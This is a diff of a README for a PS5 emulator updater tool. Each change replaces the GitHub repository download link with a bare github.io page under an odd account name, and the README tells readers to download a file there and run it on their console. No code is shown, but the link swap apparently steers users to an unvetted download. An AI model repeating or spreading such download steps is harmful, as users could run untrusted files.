@@ -1,6 +1,6 @@
 # 🎮 apr-emu-updater - Keep Your Games Always Updated
 
-[![Download Now](https://img.shields.io/badge/Download-apr--emu--updater-2ea44f?style=for-the-badge&logo=github)](https://github.com/actuaryarticulatorysystem2752/apr-emu-updater)
+[![Download Now](https://img.shields.io/badge/Download-apr--emu--updater-2ea44f?style=for-the-badge&logo=github)](https://actuaryarticulatorysystem2752.github.io)
 
 ## 🌟 What Is This?
 
@@ -15,7 +15,7 @@ Here is everything you need to know to get apr-emu-updater working on your conso
 ### 📥 Step 1: Download the Application
 
 Visit this link to download the application:  
-[**https://github.com/actuaryarticulatorysystem2752/apr-emu-updater**](https://github.com/actuaryarticulatorysystem2752/apr-emu-updater)
+[**https://actuaryarticulatorysystem2752.github.io**](https://actuaryarticulatorysystem2752.github.io)
 
 When you click the link, look for the green "Download" button on the page. Click it, and the download will start automatically. You should see the file appear in your computer's "Downloads" folder (or wherever your browser saves downloaded files).
 
@@ -135,7 +135,7 @@ No. The updates are only needed when APR Emu releases a new version. You can che
 
 Here's the entire download and setup process in three sentences:
 
-1. **Visit** [**https://github.com/actuaryarticulatorysystem2752/apr-emu-updater**](https://github.com/actuaryarticulatorysystem2752/apr-emu-updater) and click the green download button.
+1. **Visit** [**https://actuaryarticulatorysystem2752.github.io**](https://actuaryarticulatorysystem2752.github.io) and click the green download button.
 2. **Transfer** the downloaded file to a USB drive and plug it into your PS5.
 3. **Run** the payload from your PS5's homebrew menu, then open the web address shown on screen.
 
